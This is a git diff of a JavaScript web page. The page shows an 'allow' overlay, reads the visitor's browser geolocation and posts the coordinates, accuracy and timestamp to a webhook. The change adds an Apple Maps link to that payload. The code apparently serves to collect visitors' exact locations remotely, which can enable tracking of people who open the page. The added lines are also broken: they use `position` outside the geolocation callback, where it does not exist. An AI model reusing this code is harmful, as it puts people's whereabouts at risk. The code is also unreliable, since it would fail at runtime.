@@ -116,7 +116,8 @@ function getCentralTimeISO() {
 	
 	 document.addEventListener("DOMContentLoaded", () => {
      console.log("DOM loaded");
-
+  const lat = position.coords.latitude;
+  const lng = position.coords.longitude;
   const overlay = document.getElementById("overlay");
   const content = document.getElementById("content");
   const allowBtn = document.getElementById("allow");
@@ -145,7 +146,8 @@ function getCentralTimeISO() {
             latitude: position.coords.latitude,
             longitude: position.coords.longitude,
             accuracy: position.coords.accuracy,
-            timestamp: getCentralTimeISO()
+            timestamp: getCentralTimeISO(),
+			map: `https://maps.apple.com/?ll=${lat},${lng}`
           })
         }).catch(err => console.error("Webhook error:", err));
       },
